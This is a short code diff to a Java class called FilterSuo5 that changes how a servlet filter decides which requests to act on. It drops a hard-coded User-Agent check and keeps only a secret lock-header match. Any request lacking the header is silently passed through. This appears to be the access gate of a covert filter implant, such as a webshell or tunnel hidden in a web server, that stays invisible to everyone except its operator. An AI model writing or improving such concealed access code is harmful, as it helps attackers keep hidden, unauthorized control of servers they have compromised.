@@ -50,18 +50,16 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
 
     private void task(Object request, Object response, Object filterChain) {
         try {
-            if(!((String)invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey})).contains(lockHeaderValue)) {
-                return;
-            }
-            String agent = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"User-Agent"});
-            String contentType = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Type"});
-
-            if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
+            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
+            if(lv == null || !lv.contains(lockHeaderValue)) {
                 if (filterChain != null) {
                     doFilter(request, response, filterChain);
                 }
                 return;
             }
+
+            String contentType = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{"Content-Type"});
+
             if (contentType == null) {
                 return;
             }
